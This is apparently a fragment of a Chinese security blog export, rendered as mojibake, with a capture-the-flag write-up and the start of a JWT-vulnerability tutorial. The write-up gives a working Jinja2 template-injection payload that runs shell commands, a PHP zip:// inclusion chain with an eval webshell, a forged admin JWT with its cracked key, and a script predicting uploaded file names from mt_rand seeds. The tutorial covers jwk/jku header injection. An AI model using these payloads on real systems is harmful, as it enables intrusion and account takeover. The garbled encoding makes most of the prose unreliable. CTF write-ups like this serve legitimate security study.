çš„ï¼Œä¸ºäº†æ–¹ä¾¿å†™wpï¼Œå°±è´´ä¸€ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import reimport osapp = Flask(__name__)@app.route('/', methods=['GET', 'POST'])def index(): return render_template('index.html')@app.route('/secr3ttt', methods=['GET', 'POST'])def secr3t(): name = request.args.get('klf', '') template = f''' &lt;html&gt; &lt;body&gt; &lt;h1&gt;æ‰¾åˆ°secr3täº†ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°flagä½ è¿˜æ˜¯ä¸ªklf&lt;/h1&gt; &lt;h1&gt;%s&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; &lt;img src=\\&quot;https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-blog/8.jpg\\&quot; alt=&quot;g&quot;&gt; &lt;!--klf?--&gt; &lt;!-- klfè¿˜æƒ³è¦flagï¼Ÿæ²¡é‚£ä¹ˆå®¹æ˜“ --&gt; ''' bl = ['_', '\\\\', '\\'', '&quot;', 'request', &quot;+&quot;, 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr', 'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/', 'flashed', 'os', 'open', 'read', 'count', '*', '43', '45', '38', '124', '47', '59', '99', '100', 'cat', '~', ':', 'not', '0', 'length', 'index', '-', 'ord', '37', '94', '96', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '[', ']', '@', '^', '#'] for i in bl: if i in name: return render_template('klf.html') #return &quot;çœŸæ˜¯klfï¼ï¼ï¼å›å»å¤šå­¦å­¦å•¦&quot; pattern = r&quot;\\s*\\)\\s*\\)&quot; match = re.search(pattern, name) pattern2 = r&quot;\\s*\\)\\s*(,)?\\s*\\)&quot; match2 = re.search(pattern2, name) pattern3 = r&quot;\\s*\\)\\s*\\)\\s*\\|&quot; match3 = re.search(pattern3, name) pattern4 = r&quot;\\s*,\\s*\\)\\s*\\)\\s*\\|&quot; match4 = re.search(pattern4, name) pattern_mo = r&quot;\\d+\\s*%\\s*\\d+|[a-zA-Z]+\\s*%\\s*[a-zA-Z]+&quot; matche_mo = re.search(pattern_mo, name) if match: if match2.group(1): return render_template('klf.html') elif match4: return render_template('klf.html') elif match3: return render_template_string(template % name) else: return render_template('klf.html') # è¾“å‡ºåŒ¹é…çš„ç»“æœ if matche_mo : return render_template('klf.html') a=render_template_string(template % name) if &quot;{&quot; in a: return a + render_template('win.html') return a@app.route('/robots.txt', methods=['GET'])def robots(): return send_from_directory(os.path.join(app.root_path, 'static'), 'robots.txt', mimetype='text/plain')if __name__ == '__main__': app.run(host='0.0.0.0', port=7888, debug=False) è¿˜æ˜¯å¯ä»¥ç”¨klf_2çš„è§£æ³•è§£å†³,ä¸å¯ä»¥ç”¨â€œ))â€ï¼Œåªéœ€è¦ä»klf_2çš„expæ”¹ä¸€ä¸‹å°±å¥½äº†ï¼Œä¹Ÿæ˜¯ä¾¥å¹¸æ‹¿äº†ä¸€ä¸ªä¸€è¡€ poc12345678910111213141516171819202122232425262728{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{% set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%}{% set kon=(()|select|string|list)|attr(po)(17)%} {% set dian=(g|string|list)|attr(po)(6)%} {% set qian=dict(p=a)|join%}{% set hou=dict(p=a,y=b)|join%}{% set ming=(kon,kon,dict(ap=a,p=b)|join,dian,hou)|join()%}{% set cmd=(dict(ca=a,t=b)|join,ming)|join()%}{% set a=()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%}{% set bb=(a|string|list)|attr(po)(246)%}{% set ho=(dict(ap=a,p=b))|join%}{% set fl=(dict(fl4gfl4g=a,fl4g=b))|join%}{% set cmd=(dict(ca=a,t=b)|join,kon,bb,ho,bb,fl)|join%}{% set res =()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%}{% print(res) %} famale_imp_l0veåªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œè€Œä¸”å­˜åœ¨ä¸€å¤„æ–‡ä»¶åŒ…å«ï¼Œé™åˆ¶äº†åç¼€å¿…é¡»ä¸º.jpg;è¿™é¢˜çš„phpç¯å¢ƒæ˜¯5.6ï¼›\\x00çš„æˆªæ–­åœ¨php&gt;5.3.4å°±æ²¡ç”¨äº† 123456789&lt;?php//o2takuXXå¸ˆå‚…è¯´æœ‰é—®é¢˜ï¼Œå¿˜çœ‹äº†ã€‚header('Content-Type: text/html; charset=utf-8');highlight_file(__FILE__);$file = $_GET['file'];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){ include($file);}?&gt; åœ¨phpä¸­ zip://test.zip#1.pngæ˜¯ä»€ä¹ˆæ„æ€? åœ¨PHPä¸­ï¼Œzip://test.zip#1.pngæ˜¯ä¸€ç§URLå°è£…åè®®ï¼Œå®ƒå…è®¸ä½ åƒè®¿é—®æœ¬åœ°æ–‡ä»¶ä¸€æ ·è®¿é—®ZIPå­˜æ¡£ä¸­çš„æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œzip://è¡¨ç¤ºä½¿ç”¨ZIPåè®®ï¼Œtest.zipæ˜¯ZIPå­˜æ¡£çš„æ–‡ä»¶åï¼Œ#1.pngè¡¨ç¤ºå­˜æ¡£ä¸­çš„æ–‡ä»¶è·¯å¾„ã€‚å› æ­¤ï¼Œzip://test.zip#1.pngæ„å‘³ç€ä½ æ­£åœ¨å¼•ç”¨test.zipå­˜æ¡£ä¸­çš„1.pngæ–‡ä»¶ã€‚ æ–°å»ºä¸€ä¸ªæ–‡ä»¶ 1.jpgå›¾ç‰‡å†…å®¹å³å¯ä¸ºéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¦‚&lt;?php eval($_POST[1]); ?&gt;æ‰“åŒ…æˆzipå³include.php?file=zip://upload/3.zip%231.jpg change_itsource code1234 &lt;!--ç”¨æˆ·åä¸ºï¼šuserå¯†ç ä¹Ÿä¸ºï¼šuser--&gt; ç™»é™†ä¹‹åæ²¡æœ‰æƒé™ä¸Šä¼ æ–‡ä»¶ï¼ŒæŸ¥çœ‹cookieæ˜¯ä¸€æ®µjwtåŠ å¯†ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ç›´æ¥ç”¨å·¥å…·è·‘å‡ºkey 12key : &quot;yibao&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek ç°åœ¨æœ‰æƒé™ä¸Šä¼ ä»»æ„æ–‡ä»¶äº†ï¼Œä½†æ˜¯åªçŸ¥é“æ–‡ä»¶ä¸Šä¼ åœ¨uploadä¸‹ï¼Œä¸çŸ¥é“æ–‡ä»¶åï¼ŒæŸ¥çœ‹æºä»£ç  123456789101112function php_mt_seed($seed) { mt_srand($seed); } $seed = time(); php_mt_seed($seed); $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $newFileName = ''; for ($i = 0; $i &lt; 10; $i++) { $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; } è¿™ä»£ç å¾ˆæ˜æ˜¾äº†ï¼Œåªè¦çŸ¥é“timeçš„æ—¶é—´æˆ³ï¼Œæ—¢å¯ä»¥çŸ¥é“æ–‡ä»¶åï¼Œ pocè§£é‡Šä¸€ä¸‹æˆ‘çš„è„šæœ¬:è®¾ç½®ä¸€ä¸ªåç§’çš„æ—¶é—´æˆ³ï¼Œåœ¨è¿™åç§’ä¹‹å†…ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å¿…å®šå¯ä»¥ä¸­ä¸€ä¸ªæ–‡ä»¶çš„æ—¶é—´æˆ³ 123456789101112131415161718&lt;?php highlight_file(__FILE__);function php_mt_seed($seed){ mt_srand($seed);}for ($j = 0; $j &lt; 10; $j++){ $seed = time(); php_mt_seed($seed); sleep(1); echo $seed.&quot;: &quot;; $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $newFileName = ''; for ($i = 0; $i &lt; 10; $i++) { $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; } echo $newFileName.&quot;&lt;/br&gt;&quot;;} è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œåœ¨åç§’ä¹‹å†…ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶å³å¯ï¼Œç„¶åè„šæœ¬ä¼šæ ¹æ®åä¸ªæ—¶é—´æˆ³è¾“å‡ºåä¸ªæ–‡ä»¶åï¼Œå…¶ä¸­å¿…å®šä¼šä¸­ä¸€ä¸ªæ–‡ä»¶å flagä¿å«æˆ˜(å¾…å¤ç°)ezrfi(å¾…å¤ç°)scan_tool(å¾…å¤ç°)ez_sql(å¾…å¤ç°)EZ_Smuggling(å¾…å¤ç°)java(å¾…å¤ç°)","link":"/2023/11/26/Geek%20Challenge%202023/"},{"title":"JWTæ¼æ´","text":"ä»€ä¹ˆæ˜¯ JWTï¼ŸJSON web tokens (JWT) æ˜¯ä¸€ç§æ ‡å‡†åŒ–æ ¼å¼ï¼Œç”¨äºåœ¨ç³»ç»Ÿä¹‹é—´å‘é€åŠ å¯†ç­¾åçš„ JSON æ•°æ®ã€‚ç†è®ºä¸Šï¼Œå®ƒä»¬å¯ä»¥åŒ…å«ä»»ä½•ç±»å‹çš„æ•°æ®ï¼Œä½†æœ€å¸¸ç”¨äºå‘é€æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ï¼ˆâ€œå£°æ˜â€ï¼‰ï¼Œä½œä¸ºèº«ä»½éªŒè¯ã€ä¼šè¯å¤„ç†å’Œè®¿é—®æ§åˆ¶æœºåˆ¶çš„ä¸€éƒ¨åˆ†ã€‚ ä¸ç»å…¸ä¼šè¯ä»¤ç‰Œä¸åŒï¼ŒæœåŠ¡å™¨æ‰€éœ€çš„æ‰€æœ‰æ•°æ®éƒ½å­˜å‚¨åœ¨ JWT æœ¬èº«çš„å®¢æˆ·ç«¯ä¸­ã€‚ JWT æ ¼å¼JWT ç”± 3 éƒ¨åˆ†ç»„æˆï¼šæ ‡å¤´ã€æœ‰æ•ˆè´Ÿè½½å’Œç­¾åã€‚å®ƒä»¬å‡ç”±ç‚¹åˆ†éš”ï¼Œå¦‚ä»¥ä¸‹ç¤ºä¾‹æ‰€ç¤ºï¼š 1eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA JWT çš„æ ‡å¤´å’Œæœ‰æ•ˆè´Ÿè½½éƒ¨åˆ†åªæ˜¯ base64url ç¼–ç çš„ JSON å¯¹è±¡ã€‚æ ‡å¤´åŒ…å«æœ‰å…³ä»¤ç‰Œæœ¬èº«çš„å…ƒæ•°æ®ï¼Œè€Œæœ‰æ•ˆè´Ÿè½½åŒ…å«æœ‰å…³ç”¨æˆ·çš„å®é™…â€œå£°æ˜â€ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä»ä¸Šé¢çš„ä»¤ç‰Œä¸­è§£ç æœ‰æ•ˆè´Ÿè½½ä»¥æ­ç¤ºä»¥ä¸‹å£°æ˜ï¼š 123456789{ &quot;iss&quot;: &quot;portswigger&quot;, &quot;exp&quot;: 1648037164, &quot;name&quot;: &quot;Carlos Montoya&quot;, &quot;sub&quot;: &quot;carlos&quot;, &quot;role&quot;: &quot;blog_author&quot;, &quot;email&quot;: &quot;carlos@carlos-montoya.net&quot;, &quot;iat&quot;: 1516239022} åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä»»ä½•æœ‰æƒè®¿é—®ä»¤ç‰Œçš„äººéƒ½å¯ä»¥è½»æ¾è¯»å–æˆ–ä¿®æ”¹æ­¤æ•°æ®ã€‚å› æ­¤ï¼Œä»»ä½•åŸºäº JWT çš„æœºåˆ¶çš„å®‰å…¨æ€§éƒ½ä¸¥é‡ä¾èµ–äºåŠ å¯†ç­¾åã€‚ ç­¾åå‘å‡ºä»¤ç‰Œçš„æœåŠ¡å™¨é€šå¸¸é€šè¿‡æ•£åˆ—æ ‡å¤´å’Œæœ‰æ•ˆè´Ÿè½½æ¥ç”Ÿæˆç­¾åã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬è¿˜ä¼šå¯¹ç”Ÿæˆçš„å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ã€‚æ— è®ºå“ªç§æ–¹å¼ï¼Œæ­¤è¿‡ç¨‹éƒ½æ¶‰åŠç§˜å¯†ç­¾åå¯†é’¥ã€‚æ­¤æœºåˆ¶ä¸ºæœåŠ¡å™¨æä¾›äº†ä¸€ç§æ–¹æ³•æ¥éªŒè¯ä»¤ç‰Œä¸­çš„æ•°æ®è‡ªå‘å¸ƒä»¥æ¥æ²¡æœ‰è¢«ç¯¡æ”¹ï¼š ç”±äºç­¾åæ˜¯ç›´æ¥ä»ä»¤ç‰Œçš„å…¶ä½™éƒ¨åˆ†æ´¾ç”Ÿçš„ï¼Œå› æ­¤æ›´æ”¹æ ‡å¤´æˆ–æœ‰æ•ˆè´Ÿè½½çš„å•ä¸ªå­—èŠ‚ä¼šå¯¼è‡´ç­¾åä¸åŒ¹é…ã€‚ å¦‚æœä¸çŸ¥é“æœåŠ¡å™¨çš„ç§˜å¯†ç­¾åå¯†é’¥ï¼Œå°±ä¸å¯èƒ½ä¸ºç»™å®šçš„æ ‡å¤´æˆ–æœ‰æ•ˆè´Ÿè½½ç”Ÿæˆæ­£ç¡®çš„ç­¾åã€‚ æ³¨æ„ï¼šhttps://jwt.io/ ä»€ä¹ˆæ˜¯ JWT æ”»å‡»ï¼ŸJWT æ”»å‡»çš„å½±å“é€šå¸¸å¾ˆä¸¥é‡ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿä½¿ç”¨ä»»æ„å€¼åˆ›å»ºè‡ªå·±çš„æœ‰æ•ˆä»¤ç‰Œï¼Œä»–ä»¬å¯èƒ½èƒ½å¤Ÿå‡çº§è‡ªå·±çš„æƒé™æˆ–å†’å……å…¶ä»–ç”¨æˆ·ï¼Œå®Œå…¨æ§åˆ¶ä»–ä»¬çš„å¸æˆ·ã€‚ æ³¨æ„ï¼šä¸€æ—¦ JWT è¢«ç­¾å‘ï¼Œå°±æ— æ³•æ’¤é”€ã€‚å³ä½¿åœ¨ JWT è¿˜æœªè¿‡æœŸçš„æƒ…å†µä¸‹ï¼Œå¦‚æœéœ€è¦ç«‹å³ä½¿å…¶å¤±æ•ˆï¼Œæ˜¯æ— æ³•åšåˆ°çš„ï¼›ä¹Ÿå°±æ˜¯è¯´å³ä½¿ä½ çš„è´¦å·logoutï¼Œä½†æ˜¯æ›¾ç»çš„jwtä»¤ç‰Œä¾ç„¶æœ‰æ•ˆï¼› JWT æ”»å‡»çš„æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼ŸJWT æ¼æ´é€šå¸¸æ˜¯ç”±äºåº”ç”¨ç¨‹åºæœ¬èº«çš„ JWT å¤„ç†ç¼ºé™·è€Œå¼•èµ·çš„ã€‚ä¸ JWT ç›¸å…³çš„å„ç§è§„èŒƒåœ¨è®¾è®¡ä¸Šç›¸å¯¹çµæ´»ï¼Œå…è®¸ç½‘ç«™å¼€å‘äººå‘˜è‡ªè¡Œå†³å®šè®¸å¤šå®ç°ç»†èŠ‚ã€‚å³ä½¿ä½¿ç”¨ä¹…ç»è€ƒéªŒçš„åº“ï¼Œè¿™ä¹Ÿå¯èƒ½å¯¼è‡´ä»–ä»¬æ„å¤–å¼•å…¥æ¼æ´ã€‚ è¿™äº›å®ç°ç¼ºé™·é€šå¸¸æ„å‘³ç€ JWT çš„ç­¾åæœªå¾—åˆ°æ­£ç¡®éªŒè¯ã€‚è¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿç¯¡æ”¹é€šè¿‡ä»¤ç‰Œçš„æœ‰æ•ˆè´Ÿè½½ä¼ é€’ç»™åº”ç”¨ç¨‹åºçš„å€¼ã€‚å³ä½¿ç­¾åå¾—åˆ°äº†å¯é çš„éªŒè¯ï¼Œå®ƒæ˜¯å¦çœŸæ­£å¯ä¿¡åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äºæœåŠ¡å™¨çš„ç§˜å¯†å¯†é’¥æ˜¯å¦ä¿å¯†ã€‚å¦‚æœè¯¥å¯†é’¥ä»¥æŸç§æ–¹å¼æ³„éœ²ï¼Œæˆ–è€…å¯ä»¥è¢«çŒœæµ‹æˆ–æš´åŠ›ç ´è§£ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥ä¸ºä»»ä½•ä»»æ„ä»¤ç‰Œç”Ÿæˆæœ‰æ•ˆç­¾åï¼Œä»è€ŒæŸå®³æ•´ä¸ªæœºåˆ¶ åˆ©ç”¨æœ‰ç¼ºé™·çš„ JWT ç­¾åéªŒè¯æ¥å—ä»»æ„ç­¾åJWT åº“é€šå¸¸æä¾›ä¸€ç§éªŒè¯ä»¤ç‰Œçš„æ–¹æ³•å’Œå¦ä¸€ç§ä»…å¯¹å…¶è¿›è¡Œè§£ç çš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼ŒNode.js åº“jsonwebtokenæœ‰verify()å’Œdecode()ã€‚ æœ‰æ—¶ï¼Œå¼€å‘äººå‘˜ä¼šæ··æ·†è¿™ä¸¤ç§æ–¹æ³•ï¼Œåªå°†ä¼ å…¥çš„ä»¤ç‰Œä¼ é€’ç»™è¯¥decode()æ–¹æ³•ã€‚è¿™å®é™…ä¸Šæ„å‘³ç€åº”ç”¨ç¨‹åºæ ¹æœ¬ä¸éªŒè¯ç­¾åã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåç«¯æœåŠ¡å™¨å¹¶æ²¡æœ‰ä½¿ç”¨verify()å‡½æ•°å¯¹ä»¤ç‰Œè¿›è¡ŒéªŒè¯ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨decodeå‡½æ•°è§£ç  æ¥å—æ²¡æœ‰ç­¾åçš„ä»¤ç‰Œå…¶ä¸­ï¼ŒJWT æ ‡å¤´åŒ…å«ä¸€ä¸ªalgå‚æ•°ã€‚è¿™å‘Šè¯‰æœåŠ¡å™¨ä½¿ç”¨å“ªç§ç®—æ³•å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åï¼Œä»¥åŠåœ¨éªŒè¯ç­¾åæ—¶éœ€è¦ä½¿ç”¨å“ªç§ç®—æ³•ã€‚ 1234{ &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;} è¿™æœ¬è´¨ä¸Šæ˜¯æœ‰ç¼ºé™·çš„ï¼Œå› ä¸ºæœåŠ¡å™¨åˆ«æ— é€‰æ‹©ï¼Œåªèƒ½éšå¼ä¿¡ä»»æ¥è‡ªä»¤ç‰Œçš„ç”¨æˆ·å¯æ§è¾“å…¥ï¼Œè€Œæ­¤æ—¶è¯¥ä»¤ç‰Œæ ¹æœ¬å°šæœªç»è¿‡éªŒè¯ã€‚æ¢å¥è¯è¯´ï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥å½±å“æœåŠ¡å™¨å¦‚ä½•æ£€æŸ¥ä»¤ç‰Œæ˜¯å¦å¯ä¿¡ã€‚ JWTæ”¯æŒâ€œnoneâ€ç®—æ³•ã€‚å¦‚æœå°†algå­—æ®µè®¾ç½®ä¸ºâ€œnoneâ€ï¼Œåˆ™ä»»ä½•ä»¤ç‰Œéƒ½å°†è¢«è§†ä¸ºæœ‰æ•ˆã€‚ æš´åŠ›ç ´è§£å¯†é’¥æŸäº›ç­¾åç®—æ³•ï¼Œä¾‹å¦‚ HS256 (HMAC + SHA-256)ï¼Œä½¿ç”¨ä»»æ„ç‹¬ç«‹å­—ç¬¦ä¸²ä½œä¸ºå¯†é’¥ã€‚å°±åƒå¯†ç ä¸€æ ·ï¼Œè¿™ä¸€ç§˜å¯†å¯èƒ½è½»æ˜“è¢«æ”»å‡»è€…çŒœå‡ºæˆ–æš´åŠ›ç ´è§£ï¼Œ Tools: https://github.com/ticarpi/jwt_tool https://github.com/brendan-rius/c-jwt-cracker.git 1./jwtcrack &lt;token&gt; JWT æ ‡å¤´å‚æ•°æ³¨å…¥æ ¹æ®JWSè§„èŒƒï¼Œåªæœ‰algæ ‡å¤´å‚æ•°æ˜¯å¼ºåˆ¶çš„ã€‚ä½†å®é™…ä¸Šï¼ŒJWT æ ‡å¤´é€šå¸¸åŒ…å«å…¶ä»–å‡ ä¸ªå‚æ•°ã€‚æ”»å‡»è€…ç‰¹åˆ«æ„Ÿå…´è¶£çš„æ˜¯ä»¥ä¸‹å†…å®¹ã€‚ jwk- æä¾›è¡¨ç¤ºå¯†é’¥çš„åµŒå…¥å¼ JSON å¯¹è±¡ã€‚ jku- æä¾›ä¸€ä¸ª URLï¼ŒæœåŠ¡å™¨å¯ä»¥ä»ä¸­è·å–åŒ…å«æ­£ç¡®å¯†é’¥çš„ä¸€ç»„å¯†é’¥ã€‚ kid- æä¾›ä¸€ä¸ª IDï¼ŒæœåŠ¡å™¨å¯ä»¥ä½¿ç”¨è¯¥ ID åœ¨æœ‰å¤šä¸ªå¯†é’¥å¯ä¾›é€‰æ‹©çš„æƒ…å†µä¸‹è¯†åˆ«æ­£ç¡®çš„å¯†é’¥ã€‚æ ¹æ®å¯†é’¥çš„æ ¼å¼ï¼Œè¿™å¯èƒ½å…·æœ‰åŒ¹é…çš„kidå‚æ•°ã€‚ é€šè¿‡ jwk å‚æ•°æ³¨å…¥è‡ªç­¾å JWTJWSè§„èŒƒæè¿°äº†ä¸€ä¸ªå¯é€‰çš„jwkæ ‡å¤´å‚æ•°ï¼ŒæœåŠ¡å™¨å¯ä»¥ä½¿ç”¨è¯¥å‚æ•°ä»¥ JWK æ ¼å¼å°†å…¶å…¬é’¥ç›´æ¥åµŒå…¥åˆ°ä»¤ç‰Œæœ¬èº«ä¸­ã€‚ JWT æ ‡å¤´ç¤ºä¾‹ï¼š 1234567891011{ &quot;kid&quot;: &quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;, &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RS256&quot;, &quot;jwk&quot;: { &quot;kty&quot;: &quot;RSA&quot;, &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;, &quot;n&quot;: &quot;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m&quot; }} åœ¨ç†æƒ³æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨åº”è¯¥æ˜¯åªä½¿ç”¨å…¬é’¥ç™½åå•æ¥éªŒè¯JWTç­¾åçš„ï¼Œä½†å¯¹äºä¸€äº›ç›¸å…³é…ç½®é”™è¯¯çš„æœåŠ¡å™¨ä¼šç”¨JWKå‚æ•°ä¸­åµŒå…¥çš„ä»»ä½•å¯†é’¥è¿›è¡ŒéªŒè¯ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€è¡Œä¸ºï¼Œç”¨è‡ªå·±çš„RSAç§é’¥å¯¹ä¿®æ”¹è¿‡çš„JWTè¿›è¡Œç­¾åï¼Œç„¶ååœ¨JWKå¤´éƒ¨ä¸­åµŒå…¥å¯¹åº”çš„å…¬é’¥è¿›è¡Œè¶Šæƒæ“ä½œ å®éªŒå¦‚ä¸‹ å®éªŒç¯å¢ƒæ¥è‡ª:https://portswigger.net/ ä½¿ç”¨ï¼šwiener:peterç™»é™† ,æ²¡æœ‰æƒé™è®¿é—®/admin ä½¿ç”¨jwkæ³¨å…¥æ­¥éª¤ï¼š ç”Ÿæˆæ–°çš„ RSA å¯†é’¥ è¯·æ³¨æ„ï¼Œæ‚¨æ— éœ€é€‰æ‹©å¯†é’¥å¤§å°ï¼Œå› ä¸ºç¨åä¼šè‡ªåŠ¨æ›´æ–°ã€‚ æ­¤æ—¶æ ‡å¤´å·²ç»æˆåŠŸæ³¨å…¥jwkï¼›å†æ¬¡å‘é€è¯·æ±‚åŒ…ä¹‹åï¼Œå¯ä»¥æˆåŠŸæ‹¿åˆ°adminstratoræƒé™ 1234567891011{ &quot;kid&quot;: &quot;45287eda-91e5-420e-9477-95856bbfd5f2&quot;, &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RS256&quot;, &quot;jwk&quot;: { &quot;kty&quot;: &quot;RSA&quot;, &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;45287eda-91e5-420e-9477-95856bbfd5f2&quot;, &quot;n&quot;: &quot;nNJZA3RKyKP8fsXTZ9BSKlOEKM7HSo6HbaSKiDhK70mzlqHQmgAjYjFLpq-hsmlZp8oY34kLDCnMfYgNhRZlNoadPxwy7tWdUklawuQPVvbAlPbY9gIXaDpu-7h1P0bm_8uw3MtmX5PPhW7-mFysBAHb-EJIryU5xFueFuZVIJzQ1yeepb6j7IgbjDcGzO_XP0zoXQBTpJTBYlpUaAhr_5fjKiHM6LaXgQYKIcImquEDbqo9Z4N1QJYmaLZH256Ki-AP6cav6uu0erYO1eejrDJ41bg34Sd-IzaN-Rr9v2kbDoLxd_jh041uXMz0UNBVbRHnCqB6kIbG-w1O0g2Jcw&quot; }} é€šè¿‡ jku å‚æ•°æ³¨å…¥è‡ªç­¾å JWTæœ‰äº›æœåŠ¡å™¨å¹¶ä¸ä¼šç›´æ¥ä½¿ç”¨JWKå¤´éƒ¨å‚æ•°æ¥åµŒå…¥å…¬é’¥ï¼Œè€Œæ˜¯ä½¿ç”¨JKUï¼ˆJWK Set URLï¼‰æ¥å¼•ç”¨ä¸€ä¸ªåŒ…å«äº†å¯†é’¥çš„JWK Setï¼Œå½“éªŒè¯ç­¾åæ—¶ï¼ŒæœåŠ¡å™¨ä»è¯¥ URL ä¸­è·å–ç›¸å…³å¯†é’¥ï¼›æˆ‘ä»¬å°±å¯ä»¥å€Ÿæ­¤æ¥æ„é€ ä¸€ä¸ªå¯†é’¥ä»è€Œå®ç°è¶Šæƒæ“ä½œ JWK Set æ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼ŒåŒ…å«è¡¨ç¤ºä¸åŒé”®çš„ JWK æ•°ç»„ã€‚æ‚¨å¯ä»¥åœ¨ä¸‹é¢çœ‹åˆ°è¿™æ ·çš„ç¤ºä¾‹ã€‚ 12345678910111213141516{ &quot;keys&quot;: [ { &quot;kty&quot;: &quot;RSA&quot;, &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;75d0ef47-af89-47a9-9061-7c02a610d5ab&quot;, &quot;n&quot;: &quot;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&quot; }, { &quot;kty&quot;: &quot;RSA&quot;, &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA&quot;, &quot;n&quot;: &quot;fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw&quot; } ]} å®éªŒå¦‚ä¸‹ å³é”®å•å‡»åˆšåˆšç”Ÿæˆçš„å¯†é’¥æ¡ç›®ï¼Œç„¶åé€‰æ‹©å°†å…¬é’¥å¤åˆ¶ä¸º JWKã€‚ 